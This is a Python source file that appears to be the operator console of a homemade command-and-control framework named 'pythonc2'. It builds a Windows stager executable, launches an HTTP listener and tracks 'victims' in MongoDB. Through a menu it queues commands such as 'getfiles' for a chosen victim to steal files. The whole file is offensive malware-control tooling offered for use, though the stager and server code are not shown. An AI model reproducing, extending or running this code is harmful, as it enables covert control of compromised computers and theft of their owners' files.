import subprocess
import  os,signal
import shutil
import pdb
import argparse
from flask import Flask,request
import pymongo
import re
import datetime


def generate_stager():
	## Convert to exe and save
	if os.path.exists('./tmp'):
		shutil.rmtree('./tmp')

	os.mkdir('./tmp')
	subprocess.call('cp stager.spec tmp',shell=True)
	subprocess.call('cp requirements.txt tmp',shell=True)
	subprocess.call('cp stager.py tmp',shell=True)
	subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)



## Initializes the various collections in the db with a sample record.
def init_db(myclient):

	dblist = myclient.list_database_names()
	if "pythonc2" not in dblist:
		print("Creating database")
		mydb = myclient["pythonc2"]

	mydb = myclient["pythonc2"]
	collections = mydb.list_collection_names()

	if 'commands' not in collections:
		mycol = mydb["commands"]
		h = {'sample':'To initialize db'}
		mycol.insert_one(h)

	if 'victims' not in collections:
		mycol = mydb["victims"]
		h = {'sample':'To initialize db'}
		mycol.insert_one(h)


## Drops the collections whenever the server quits
def exit_db(myclient):  
	mydb = myclient["pythonc2"]
	cmds = mydb["commands"]
	cmds.drop()
	victims = mydb["victims"]
	victims.drop()


## Inserts a command issued to a victim in the db
def insert_cmd_db(myclient,cmd,victim_id):
	mydb = myclient["pythonc2"]
	mycol = mydb["commands"]
	h = {'victim_id': victim_id,'command':cmd}
	mycol.insert_one(h)



## Shows the various victim present in the db/connected with the server. maybe dead or alive.
def show_victims(myclient):
	mydb = myclient['pythonc2']
	mycol = mydb["victims"]
	for victim in mycol.find():
		if 'id' in victim:
			print(victim['id'])


## Gets the last seen of the victim. If lastseen > 60secs, vicitim considered dead.
def get_victim_status(lastseen):
	time = datetime.datetime.now() - lastseen
	if time.total_seconds() > 60:
		print("Victim Dead. Seen "+str(time.total_seconds())+" secs ago.")
	else:
		print("Victim alive. Seen "+str(time.total_seconds())+" secs ago.")


## Gets the various info of the victim. Trigerred by the info command.
def get_victim_info(myclient,victim_id):
	mydb = myclient['pythonc2']
	victims = mydb["victims"]
	victim = victims.find_one({'id':victim_id})
	if victim:
		for key in victim.keys():
			if key != '_id':
				print(key + ' ---> '+ str(victim[key]))

		get_victim_status(victim['lastseen'])
	else:
		print("No info to show...Something is wrong..")


## Checks if a victim id is present in the DB.
def victim_present(myclient,victim_id):
	mydb = myclient['pythonc2']
	mycol = mydb["victims"]
	for victim in mycol.find():
		if 'id' in victim and victim['id'] == victim_id:
			return True
	return False


## Displays the victim menu
def victim_menu(myclient,victim_id):
	print("Interacting with victim - "+ victim_id)
	while True:
		print("Enter Victim based commands..")
		cmd = str(input())

		if cmd == 'info':
			get_victim_info(myclient,victim_id)
		if cmd == 'getfiles':
			insert_cmd_db(myclient,cmd,victim_id)
		elif cmd == 'back':
			print("Going back to main menu...")
			return


def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	
	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
	args = parser.parse_args()
	return args



def kill_listeners(flask_process):
	os.killpg(os.getpgid(flask_process.pid), signal.SIGTERM)



def main(myclient):
	args = parser()
	init_db(myclient)
	if args.generate:
		## Import stager code and convert to exe
		generate_stager()

	while True:
		print("Enter command:")
		cmd = str(input())
		if cmd == 'http':
			## Run a http listsener
			## see the process id 'ps -ef |grep nohup'
			## https://stackoverflow.com/questions/4789837/how-to-terminate-a-python-subprocess-launched-with-shell-true
			flask_process = subprocess.Popen('sudo nohup python3 server.py > log.txt 2>&1 &',stdout=subprocess.PIPE, 
					shell=True, preexec_fn=os.setsid)

			# grep = subprocess.check_output('ps -ef | grep "nohup python3 server.py"',shell=True)
			# grep = grep = grep.decode("utf-8")
			# flask_pid = grep.split('\n')[0].split()[1]
		if cmd == 'jobs':
			if 'flask_process' in locals():
				print("HTTP listener running ")
			else:
				print("No listener running")
		if cmd == 'kill':
			if 'flask_process' in locals():
				kill_listeners(flask_process)
				print("killed http listener")
			else:
				print("No listener running")
		if cmd == 'generate':
			generate_stager()
			print("exe dumped to ./tmp")

		if cmd == 'victims':
			show_victims(myclient)
		## Matching use LKF0599NMU
		if re.match(r'use\s[\w]{10}',cmd):
			## Implement the use victim logic
			vicitim_id = re.findall(r'[\w]{10}',cmd)[0]
			if victim_present(myclient,vicitim_id):
				victim_menu(myclient,vicitim_id)
			else:
				print("Victim not present")
		
		if cmd == 'exit':
			if 'flask_process' in locals():
				kill_listeners(flask_process)
			exit_db(myclient)
			break





if __name__=="__main__":
	myclient = pymongo.MongoClient("mongodb://localhost:27017/")
	try:
		main(myclient)
	except KeyboardInterrupt:
		kill_listeners(flask_process)
		exit_db()